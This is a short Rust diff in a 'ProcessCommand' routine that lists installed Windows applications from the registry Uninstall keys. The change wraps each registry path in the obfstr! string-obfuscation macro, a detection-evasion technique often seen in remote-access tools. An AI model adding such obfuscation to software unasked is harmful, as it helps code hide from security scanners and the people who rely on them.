@@ -315,7 +315,7 @@ impl ProcessCommand {
         let mut apps = Vec::new();
         
         let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
-        if let Ok(uninstall) = hklm.open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall") {
+        if let Ok(uninstall) = hklm.open_subkey(obfstr::obfstr!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall")) {
             for key_name in uninstall.enum_keys().filter_map(|k| k.ok()) {
                 if let Ok(key) = uninstall.open_subkey(&key_name) {
                     let display_name: Result<String, _> = key.get_value("DisplayName");
@@ -328,7 +328,7 @@ impl ProcessCommand {
             }
         }
 
-        if let Ok(uninstall) = hklm.open_subkey("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall") {
+        if let Ok(uninstall) = hklm.open_subkey(obfstr::obfstr!("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall")) {
             for key_name in uninstall.enum_keys().filter_map(|k| k.ok()) {
                 if let Ok(key) = uninstall.open_subkey(&key_name) {
                     let display_name: Result<String, _> = key.get_value("DisplayName");
@@ -345,7 +345,7 @@ impl ProcessCommand {
         }
         
         let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-        if let Ok(uninstall) = hkcu.open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall") {
+        if let Ok(uninstall) = hkcu.open_subkey(obfstr::obfstr!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall")) {
             for key_name in uninstall.enum_keys().filter_map(|k| k.ok()) {
                 if let Ok(key) = uninstall.open_subkey(&key_name) {
                     let display_name: Result<String, _> = key.get_value("DisplayName");
